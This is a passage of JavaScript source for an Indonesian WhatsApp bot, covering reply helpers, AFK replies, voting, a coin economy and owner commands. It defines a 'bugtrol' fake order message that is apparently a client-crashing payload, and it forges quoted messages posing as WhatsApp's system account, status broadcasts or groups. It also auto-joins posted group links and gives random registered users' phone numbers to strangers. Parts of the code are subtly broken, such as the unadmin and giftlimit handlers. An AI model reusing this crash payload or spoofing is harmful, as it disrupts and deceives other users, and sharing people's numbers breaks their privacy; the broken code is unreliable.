            hexa.sendMessage(from, teks, text, {quoted:mek, contextInfo:{"externalAdReply":{"title": fake, mediaType: 2, "thumbnailUrl": "https://telegra.ph/file/6b0259fd741e108910fbe.jpg","previewType": "VIDEO","mediaUrl": `https://www.instagram.com/p/CRNTp51AvjG/?utm_medium=copy_link   `}}})
        }
        
        const freply = (teks) => {
           hexa.sendMessage(from, teks, text, {quoted:mek, contextInfo:{"externalAdReply":{"title": fake,"body": `FajarGanz`,"previewType": "PHOTO","thumbnailUrl": `https://telegra.ph/file/6b0259fd741e108910fbe.jpg`,"thumbnail": fs.readFileSync(`stik/thumb.jpeg`),"sourceUrl": `https://wa.me/6283856237829`}}})
        }  

      const FajarGanz ={key: {fromMe: false,"participant":"0@s.whatsapp.net",   "remoteJid": "6289523258649-1604595598@g.us"  }, "message": {orderMessage: {itemCount: 2003,status: 200, thumbnail: fs.readFileSync(`stik/fake.jpeg`), surface: 200, message: `${wib} ${pushname}`, orderTitle: 'FajarGanz', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}   
      
      const bugtrol = {   key: {  fromMe: false,   participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: from } : {})   },      "message": {      "orderMessage": {      "orderId": "389932495887487",  "itemCount": 1000000000000,  "status": "INQUIRY",  "surface": "CATALOG",  "message": "*FajarGanz*",  "orderTitle": "Fajar",  "sellerJid": "0@s.whatsapp.net",  "token": "AR6i7smUt97Y2ZH037RTuxZYdqYSjHGWn61cCMak9nb69w=="
		}}}
		
	  const sendFakeLink = (id, res, type, title, body, thumbnail, quoted, ptt = false) => {
           hexa.sendMessage(id, res, type,{quoted:quoted,contextInfo: {externalAdReply:{title:title,body:body,previewType:"PHOTO",thumbnail:thumbnail,sourceUrl:`https://wa.me/6283856237829`}}})
         }
         
         const replyfakelink = (teks) => {
                 hexa.sendMessage(from, teks, text,{contextInfo :{text: 'hi',
                 "forwardingScore": 1000000000,
                   isForwarded: false,
                   sendEphemeral: false,
                "externalAdReply": {
                "title": `Whatsapp-BOT\nF a J a R. (ᴹᴿ᭄ғᴀᴊᴀʀ⍣⁴̅⁰͍⁴̵) •Instagram photos and Videos`,
                "body": "",
                "previewType": "PHOTO",
                "thumbnailUrl": "https://j.top4top.io/p_20682m4yj0.jpg",
                "thumbnail": fake,
                "sourceUrl": `https://wa.me/6283856237829`
                },mentionedJid:[sender]}, quoted : FajarGanz})

         };

        const fakestatus = (teks) => {
            hexa.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./stik/thumb.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
        const fakethumb = (teks, yes) => {
            hexa.sendMessage(from, teks, image, {thumbnail:fs.readFileSync('./stik/fake.jpeg'),quoted:mek,caption:yes})
        }
        const fakegroup = (teks) => {
            hexa.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./stik/thumb.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
        const sendStickerFromUrl = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './stik' + names + '.png', async function () {
                    console.log('selesai');
                    let filess = './stik' + names + '.png'
                    let asw = './stik' + names + '.webp'
                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        let media = fs.readFileSync(asw)
                        hexa.sendMessage(to, media, MessageType.sticker,{quoted:mek})
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                    });
                });
            }
        const sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    hexa.sendMessage(to, media, type, { quoted: mek, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            }   
//FUNCTION
            cekafk(afk)
            if (!mek.key.remoteJid.endsWith('@g.us') && offline){
            if (!mek.key.fromMe){
            if (isAfk(mek.key.remoteJid)) return
            addafk(mek.key.remoteJid)
            heheh = ms(Date.now() - waktu) 
            hexa.sendMessage(mek.key.remoteJid,`@${owner} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}})
            }
            }   
        if (mek.key.remoteJid.endsWith('@g.us') && offline) {
        if (!mek.key.fromMe){
        if (mek.message.extendedTextMessage != undefined){
        if (mek.message.extendedTextMessage.contextInfo != undefined){
        if (mek.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
        for (let ment of mek.message.extendedTextMessage.contextInfo.mentionedJid) {
        if (ment === `${owner}@s.whatsapp.net`){
        if (isAfk(mek.key.remoteJid)) return
        addafk(mek.key.remoteJid)
        heheh = ms(Date.now() - waktu)
        hexa.sendMessage(mek.key.remoteJid,`@${owner} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}})
          }
        }
            }
          }
        }
      }
    }
//========================================================================================================================//
		colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
      	if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
      	//if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
     	if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
      	//if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
	    if(isGroup && !isVote) {
        if (budy.toLowerCase() === 'vote'){
        let vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`))  
        let fil = vote.map(v => v.participant)
        let id_vote = sender ? sender : '6285751056816@s.whatsapp.net'
        if(fil.includes(id_vote)) {
        return mentions('@'+sender.split('@')[0]+' Anda sudah vote', fil, true)
        } else {
        vote.push({
            participant: id_vote,
            voting: '✅'
        })
        fs.writeFileSync(`./lib/${from}.json`,JSON.stringify(vote))
        let _p = []
        let _vote = '*Vote* '+ '@'+ _votes[0].votes.split('@')[0] + `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n` 
        for(let i = 0; i < vote.length; i++) {
        _vote +=  `@${vote[i].participant.split('@')[0]}\n*Vote* : ${vote[i].voting}\n\n`
        _p.push(vote[i].participant)
        }  
        _p.push(_votes[0].votes)
        mentions(_vote,_p,true)   
        }
        } else if (budy.toLowerCase() === 'devote'){
        const vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`))  
        let fil = vote.map(v => v.participant)
        let id_vote = sender ? sender : '6285751056816@s.whatsapp.net'
        if(fil.includes(id_vote)) {
        return mentions('@'+sender.split('@')[0]+' Anda sudah vote', fil, true)
        } else {
        vote.push({
            participant: id_vote,
            voting: '❌'
        })
        fs.writeFileSync(`./lib/${from}.json`,JSON.stringify(vote))
        let _p = []
        let _vote = '*Vote* '+ '@'+ _votes[0].votes.split('@')[0] + `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n` 
        for(let i = 0; i < vote.length; i++) {
        _vote +=  `@${vote[i].participant.split('@')[0]}\n*Vote* : ${vote[i].voting}\n\n`
        _p.push(vote[i].participant)
        }  
        _p.push(_votes[0].votes)
        mentions(_vote,_p,true)   
        }
    }
}	
          if (isGroup && autojoin == false) {
      if (budy.includes("://chat.whatsapp.com/")) {
        console.log(
          color("[AUTO-JOIN]", "red"),
          color("YAHAHAHHAHAH", "white")
        );
        hexa.query({
          json: [
            "action","invite",
            `${budy.replace("https://chat.whatsapp.com/", "")}`,
          ],
        });
      }
    }
    
    if (isGroup && isAntivirtex && !mek.key.fromMe) {
      if (budy.length > 700) {
        if (isGroupAdmins) return reply("admin bebas");
        replyfakelink("ANTIVIRTEX DETECTED!! MAAF ANDA AKAN DIKICK ;V");
        hexa.groupRemove(from, sender);
      }
    }
//================================================================================================================================================================\\
if (isGroup && !antivo && m.mtype == 'viewOnceMessage'){
var msg = {...mek}
msg.message = mek.message.viewOnceMessage.message
msg.message[Object.keys(msg.message)[0]].viewOnce = false
reply('Saya Mendetaksi ANDA Mengirim Foto/Video ViewOnce')
hexa.forwardMessage(from, msg)
}
if (m.message && !m.key.fromMe && m.isBaileys && m.quoted && m.quoted.mtype === 'orderMessage' && !(m.quoted.token && m.quoted.orderId)) {
m.reply('SI ANYING PAKE FAKE TROLI_-\n\n' + require('util').format(m.key))
await hexa.modifyChat(m.chat, 'delete', {
 includeStarred: false
})
}    
if (!isGroup && !isCmd && !command && !mek.key.fromMe && !autorespon) {
numd = await fetchJson(`https://api.telnyx.com/anonymous/v2/number_lookup/${senderNumber}`, {method: 'get'})
simi = await fetchJson(`https://api.simsimi.net/v1/?lang=${numd.data.country_code}&cf=false&text=${cmd}`)
sami = simi.success
hexa.sendMessage(from, `_${sami}_`, text, {thumbnail: fs.readFileSync(`stik/thumb.jpeg`), sendEphemeral: true, quoted:mek, contextInfo : {forwardingScore: 508, isForwarded: true, "externalAdReply": {"title": `Hai Kak ${pushname}👋🏻`, mediaType: 2, "thumbnailUrl": "https://telegra.ph/file/6b0259fd741e108910fbe.jpg","previewType": "VIDEO","mediaUrl": `https://youtu.be/5odMRQDrhoI`}}})
}    
var chats = await hexa.chats.array.filter(v => v.jid.endsWith('g.us'))
   chats.map( async ({ jid }) => {
    if (readG === false) return
    await hexa.chatRead(jid)
     })
    var chatss = await hexa.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
    chatss.map( async ({ jid }) => {
    if (readP === false) return
    await hexa.chatRead(jid)
    })
/*
const isImage = (type === 'imageMessage')
const isVideo = (type === 'videoMessage')
const isSticker = (type == 'stickerMessage')
if (isGroup && isAutoSticker) {
              if (isImage || isVideo) {
              let media = await hexa.downloadAndSaveMediaMessage(mek, `./sticker/${sender}`)
              hexa.sendSticker(from, media, mek).then((res) => fs.unlinkSync(media))
             }
        }*/

const buruh4 = ['🗿','🍐','🐦','🍇','🍒','🍋','🛢','🔮','🎄','🎃','🍓','🍉','🍈','🍜','🎎']
const buruh3 = ['🗿','🛢','🔮','🎄','🎃','🐦','🍉','🍈','🍜','🎎']
const buruh1 = ['🐳','🦈','🐬','🐋','🐟','🐠','🦐','🦑','🦀','🐚']
const buruh2 = ['🐔','🦃','🐿','🐐','🐏','🐖','🐑','🐎','🐺','🦩']
const buruh11 = buruh1[Math.floor(Math.random() * (buruh1.length))]
const buruh22 = buruh2[Math.floor(Math.random() * (buruh2.length))]
const buruh33 = buruh3[Math.floor(Math.random() * (buruh3.length))]

const timestampp = speed();
	const latensii = speed() - timestampp
    const totalgrouppp = await hexa.chats.array.filter(v => v.jid.endsWith('g.us'))
    const totalkontakkk = await hexa.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
    const totalchattt = await hexa.chats.all()
    
const SadGril = "6283856237829@s.whatsapp.net"
const display = `    
👑 _Creator_ : @${SadGril.split("@")[0]}
👑 _Hit Today_ : ${hit_today.length} 𝑯𝒊𝒕
👑 _Lib_ : 𝑩𝒂𝒊𝒍𝒆𝒚𝒔
👑 _Type_ : 𝑵𝒐𝒅𝒆𝑱𝒔
👑 _Prefix_ : 「 MULTI-PREFIX 」
👑 _Mode_ : ${banChats ? '𝑺𝑬𝑳𝑭' : '𝑷𝑼𝑩𝑳𝑰𝑪'}
👑 _Status_ : ${offline ? '𝑶𝑭𝑭𝑳𝑰𝑵𝑬' : '𝑶𝑵𝑳𝑰𝑵𝑬'}
👑 _User_ : ${prema}
👑 _Group Chats_ : ${totalgrouppp.length}
👑 _Private Chats_ : ${totalkontakkk.length}
👑 _Total Chats_ : ${totalchattt.length}
👑 _Speed_ : ${latensii.toFixed(4)} 𝑺𝒆𝒄𝒐𝒏𝒅𝒔

*</INFO TIME>*
👑 _${wib}_ 𝙒𝙄𝘽
👑 _${wita}_ 𝙒𝙄𝙏𝘼
👑 _${wit}_ 𝙒𝙄𝙏

Diriku yakin, engkau bukanlah kacang yg lupa akan kulitnya.
 tp engkau adl bagian dari dimensi api yg tak lupa asapnya :)
 
BTW BOT INI LAGI TAHAP UPDATE`
const create = `ᴹᴿ᭄ғᴀᴊᴀʀ⍣⁴̅⁰͍⁴̵`
a = '🌹'
b = '🐋'
c = '🐬'
d = '🦈'
e = '🦕'


        if (!mek.key.fromMe && banChats === true) return
switch (command) {

case 'menu':  case 'help':
   buttons = [
{buttonId: `${prefix}menua`, buttonText: {displayText: '📒 MENU BOT'}, type: 1},
{buttonId: `${prefix}owner`, buttonText: {displayText: '👤 CONTACT OWNER'}, type: 1},
{buttonId: `${prefix}oh`, buttonText: {displayText: 'REGISTER'}, type: 1}
]
sendButLoc(from, display,create, fs.readFileSync(`stik/thumb.jpeg`),buttons,{mimetype: Mimetype.jpeg, contextInfo: {"mentionedJid":[user,sender], externalAdReply:{title:'Official Whatsapp Bot',body:'Akira',previewType:"PHOTO",thumbnail:fs.readFileSync('./stik/fake.jpeg'),sourceUrl:`https://wa.me/6287705048235`}}})
break

case 'owner':
let inilist = []
for (let i of ownerNumber) {
const vname = hexa.contacts[i] != undefined ? hexa.contacts[i].vname || hexa.contacts[i].notify : undefined
inilist.push({
"displayName": 'FajarBrutal',
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname ? `${vname}` : `${hexa.user.name}`}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
})
}
hehe = await hexa.sendMessage(from, {
"displayName": `${inilist.length} kontak`,
"contacts": inilist 
}, 'contactsArrayMessage', { quoted: FajarGanz })
button = [
  {buttonId: `${prefix}sewabot`, buttonText: {displayText: '📒 SEWA BOT'}, type: 1},
  {buttonId: `${prefix}sc`, buttonText: {displayText: '📄 SCRIPT BOT'}, type: 1},
]
 buttons = {
    contentText: 'Nih Kak Owner ku ><',
    footerText: `FajarGanz`,
    buttons: button,
    headerType: 1
}
await hexa.sendMessage(from, buttons, MessageType.buttonsMessage, {quoted: hehe})
break

           case 'regis':
           reply('BOT akan kirim kode verifi lewat privat')
           hexa.sendMessage(sender, `
Kode Verify : 281976 
  
Anda juga dapat mengetuk tautan ini untuk verifikasi: https://wa.me/6288293524506?text=281976 
  
Kode ini bersifat sementara dan bisa jadi sama dengan orang lain.   
TRIMAKASIH SUDAH MAU REGIS :)`, text, {"contextInfo": {text: 'HelloWorld',"forwardingScore": 3,isForwarded: true,sendEphemeral: true,mentionedJid: [sender],"externalAdReply": {"title": `Hallo kak ${pushname}`,"body": ``,"previewType": "PHOTO","thumbnailUrl": `https://telegra.ph/file/32e81af991b059618ac74.jpg`,"thumbnail": fs.readFileSync(`stik/thumb.jpeg`),"sourceUrl": "https://wa.me/6283856237829"}}, quoted: FajarGanz})
           break
           
           case 'oh':
           reply('BOT akan kirim kode verifi lewat privat')
           hexa.sendMessage(sender, `*Nih kak Kode Regis Nya Heheheh [281976] `, text, {"contextInfo": {text: 'HelloWorld',"forwardingScore": 3,isForwarded: true,sendEphemeral: true,mentionedJid: [sender],"externalAdReply": {"title": `Hallo kak ${pushname}`,"body": ``,"previewType": "PHOTO","thumbnailUrl": `https://telegra.ph/file/32e81af991b059618ac74.jpg`,"thumbnail": fs.readFileSync(`stik/thumb.jpeg`),"sourceUrl": "https://wa.me/6283856237829"}}, quoted: FajarGanz})
           break
           
           case 'api':
           hexa.sendMessage(from, `*Nih kak rest api yang DI BIKIN oleh DHEAN Dan juga free*\n\nhttps://dhnjing.xyz/\n\n*Gunakan dengan bijak dan jangan spam yah kak 🙏🏻*`, text, {"contextInfo": {text: 'HelloWorld',"forwardingScore": 3,isForwarded: true,sendEphemeral: true,mentionedJid: [sender],"externalAdReply": {"title": `Hallo kak ${pushname}`,"body": ``,"previewType": "PHOTO","thumbnailUrl": `https://telegra.ph/file/32e81af991b059618ac74.jpg`,"thumbnail": fs.readFileSync(`stik/thumb.jpeg`),"sourceUrl": "https://wa.me/6283856237829"}}, quoted: FajarGanz})
           break
           
           case 'sc':
                   if (!isRegistered) return reply(ind.noregis())
                   hexa.sendMessage(from, `Oalah Nyari Sc Toh Boleh Lah Ke Onwer Saya Tawar Menawar >_<`, text, {quoted: mek})
                   break

     case 'sewabot':
               if (!isRegistered) return reply(ind.noregis())
               if (isBanned) return reply(ind.baned())
                   hexa.sendMessage(from, sewabot(prefix) , text, { quoted: mek })
                break

        case 'mutual':
        case 'cariteman':{ 
             	reply(mess.lim)
                 hem = getRegisteredRandomId(_registered).replace('@s.whatsapp.net','')
                 reply('Tunggu Sebentar, Sedang Mencari Seseorang...')
         try {
                ppimg = await hexa.getProfilePicture(`${hem.split('@')[0]}@c.us`)
   } catch {
                ppimg = `${imagebb}`
                }

teks = `Seseorang Telah Di Temukan, Semoga Cocok :v

*Nomor : ${hem.split("@")[0]}*
*Api : wa.me/${hem.split("@")[0]}*`
gh = await getBuffer(ppimg)
    const gambra = await hexa.prepareMessage(from, gh, MessageType.image, {thumbnail: fs.readFileSync(`stik/thumb.jpeg`)})
    const buttonsss = [{buttonId:`${prefix}mutual`,buttonText: {displayText: '➡️ NEXT ➡️'}, type: 1}]
    const ButtonsMessages = {
    contentText: teks,
    buttons: buttonsss,
    footerText: `BOT CREATED BY Fajar`,
    headerType: 4,
    imageMessage: gambra.message.imageMessage
    }
  await hexa.sendMessage(from, ButtonsMessages, MessageType.buttonsMessage, {contextInfo :{text: 'Hai',
  "forwardingScore": 1000000000,
  isForwarded: false,
  sendEphemeral: false,
  "externalAdReply": {
  "title": `Untuk Memulai Obrolan`,
  "body": `Klik Di Sini`,
  "previewType": "PHOTO",
  "thumbnailUrl": '',
  "thumbnail": fs.readFileSync(`stik/thumb.jpeg`),
  "sourceUrl": `https://wa.me/${hem.split("@")[0]}?text=Hai`
  }, mentionedJid:[hem]}, quoted : mek})
  }
  break
		
		case 'transfer':
				if (!isRegistered) return reply(ind.noregis())
		        if (isBanned) return reply(ind.baned())
				if (!q.includes('|')) return  reply(ind.wrongf())
                const tujuan = q.substring(0, q.indexOf('|') - 1)
                const jumblah = q.substring(q.lastIndexOf('|') + 1)
                if(isNaN(jumblah)) return await reply('jumlah harus berupa angka!!')
                if (jumblah < 100 ) return reply(`minimal transfer 100`)
                if (checkATMuser(sender) < jumblah) return reply(`uang mu tidak mencukupi untuk melakukan transfer`)
                const tujuantf = `${tujuan.replace("@", '')}@s.whatsapp.net`
                fee = 0.005 *  jumblah
                hasiltf = jumblah - fee
                addKoinUser(tujuantf, hasiltf)
                confirmATM(sender, jumblah)
                addKoinUser('${ownerNumber}', fee)
                reply(`「 SUKSES 」*n\npengiriman uang telah sukses\ndari : +${sender.split("@")[0]}\nke : +${tujuan}\njumblah transfer : ${jumblah}\npajak : ${fee}`)
                break
                
		  case 'limit':
				   if (!isRegistered) return reply(ind.noregis())
		           if (isBanned) return reply(ind.baned())
				   checkLimit(sender)
					break
			
			case 'dompet':
                 if (!isRegistered) return reply( ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				const kantong = checkATMuser(sender)
				reply(ind.uangkau(pushname, sender, kantong))
				break
				
	    case 'potion':                     
                    if (!isRegistered) return reply( ind.noregis())
                    if (isBanned) return reply('Maaf kamu sudah terbenned !')
				    checkPotion(sender)
					break
					
	    case 'heal':                     
                    if (!isRegistered) return reply( ind.noregis())
                    if (isBanned) return reply('Maaf kamu sudah terbenned !')
				    checkHeal(sender)
					break
				
		case 'buylimit':
                 if (!isRegistered) return reply( ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				payout = body.slice(10)
				const koinPerlimit = 2000
				const total = koinPerlimit * payout
				if ( checkATMuser(sender) <= total) return reply(`Maaf uang kamu belum mencukupi. silahkan kumpulkan dan beli nanti`)
				if ( checkATMuser(sender) >= total ) {
					confirmATM(sender, total)
					bayarLimit(sender, payout)
					await reply(`*「 PEMBAYARAN BERHASIL 」*\n\n*Pengirim* : Admin\n*Penerima* : ${pushname}\n*Nominal pembelian* : ${payout} \n*Harga limit* : ${koinPerlimit}/limit\n*Sisa uang mu* : ${checkATMuser(sender)}\n\nProses berhasil dengan nomer pembayaran\n${createSerial(20)}`)
				} 
				break
				
		case 'buypremiumlimit':
                 if (!isRegistered) return reply( ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				payout = body.slice(17)
				const koinpremPerlimit = 500
				const totalprem = koinpremPerlimit * payout
				if ( checkATMuser(sender) <= totalprem) return reply(`Maaf uang kamu belum mencukupi. silahkan kumpulkan dan beli nanti`)
				if ( checkATMuser(sender) >= totalprem ) {
					confirmATM(sender, totalprem)
					bayarLimit(sender, payout)
					await reply(`*「 PEMBAYARAN BERHASIL 」*\n\n*Pengirim* : zainツ\n*Penerima* : ${pushname}\n*Nominal pembelian* : ${payout} \n*Harga limit* : ${koinpremPerlimit}/limit\n*Sisa uang mu* : ${checkATMuser(sender)}\n\nProses berhasil dengan nomer pembayaran\n${createSerial(20)}`)
				} 
				break
				
		case 'giftlimit': 
                 if (!isRegistered) return reply( ind.noregis())
				if (!isOwner) return reply('*Only Adminban & Owner Kami!*')
				const nomerr = args[0].replace('@','')
                		const jmla = args[1]
                		if (jmla <= 1) return reply(`minimal gift limit adalah 1`)
                		if (isNaN(jmla)) return reply(`limit harus berupa angka`)
                		if (!nomerr) return reply(`maaf format salah\nmasukan parameter yang benar\ncontoh : ${prefix}giftlimit @6282189387018 20`)
                		const cysz = nomerr + '@s.whatsapp.net'
                		var found = false
                        			Object.keys(_limit).forEach((i) => {
                            			if(_limit[i].id === cysz){
                                			found = i
                            			}
                        		})
                        	if (found !== false) {
                            	_limit[found].limit -= jmla
                            	const updated = _limit[found]
                            	const result = `Gift kuota limit sukses dengan NS: ${createSerial(20)} pada ${moment().format('DD/MM/YY HH:mm:ss')}
							*「 GIFT KUOTA LIMIT 」*
							• User : @${updated.id.replace('@s.whatsapp.net','')}
							• Limit: ${limitawal-updated.limit}`
                            	console.log(_limit[found])
                            	fs.writeFileSync('./database/limit.json',JSON.stringify(_limit));
                            	reply(result)
                        	} else {
                                reply(`Maaf, nomor ${nomerr} tidak terdaftar di database!`)
                        	}
               			break
					
			case 'admin':
				if (!isOwner) return reply(ind.ownerb())
				admm = body.slice(7)
				adm.push(`${admm}@s.whatsapp.net`)
				fs.writeFileSync('./database/admin.json', JSON.stringify(adm))
				reply(`Berhasil menambahkan admin bot wa.me/${admm} `)
				break
				
                case 'unadmin':
				if (!isOwner) return reply(ind.ownerb())
				admm = body.slice(9)
				admin.push(`${adm}@s.whatsapp.net`)
				fs.writeFileSync('./database/admin.json', JSON.stringify(adm))
				reply(`Berhasil menambahkan admin bot wa.me/${adm} `)
				break
				
                case 'premium':
				if (!isOwner) return reply(ind.ownerb())
				premm = body.slice(9)
				prem.push(`${premm}@s.whatsapp.net`)
				fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
				reply(`Why Jdi premium dong kek kontol lu canda om :v wa.me/${premm} `)
				break
				
			case 'unpremium':
				if (!isOwner) return reply(ind.ownerb())
				premm = body.slice(11)
				prem.splice(`${premm}@s.whatsapp.net`, 1)
				fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
				reply(`Nomor sudah berakhir menjadi premium kek tytyd si lu wa.me/${premm} `)
				break
				
                case 'premiumlist':
               if (!isRegistered) return reply( ind.noregis())    
				teks = 'This is list of premium number :\n'
				for (let premm of prem) {
					teks += `~> @${premm.split('@')[0]}\n`
					}
					teks += `Total : ${prem.length}`
				hexa.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": prem}})
				break
				
			case 'ban':
				if (!isOwner) return reply(ind.ownerb())
				bnnd = body.slice(5)
				ban.push(`${bnnd}@s.whatsapp.net`)
				fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
				reply(`Berhasil membanned nomor : wa.me/${bnnd} `)
				break
				
		case 'unban':
				if (!isOwner) return reply(ind.ownerb())
				bnnd = body.slice(7)
				ban.splice(`${bnnd}@s.whatsapp.net`, 1)
				fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
				reply(`Nomor wa.me/${bnnd} telah di unban!`)
				break
				
                case 'banlist':
                 if (!isRegistered) return reply( ind.noregis())    
				teks = 'This is list of banned number :\n'
				for (let benn of ban) {
					teks += `~> @${benn.split('@')[0]}\n`
					}
					teks += `Total : ${ban.length}`
				hexa.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": ban}})
				break
				
			case 'bukapin':
                			if (isPin) return  reply(ind.redipin())
                			if (!q.includes('2021')) return  reply(ind.wrongf())
                			const pinUser = q.substring(0, q.indexOf('2021') - 0)
                			if(isNaN(pinUser)) return await reply('harus berupa angka!!')
                					veri = sender
                					if (isGroup) {
                    			addRegisteredUser(sender, pinUser, time)
                    			await hexa.sendMessage({quoted: mek, caption: ind.nopin(pinUser, time, sender)})
                    			addATM(sender)
                    			addLevelingId(sender)
                    			checkLimit(sender)
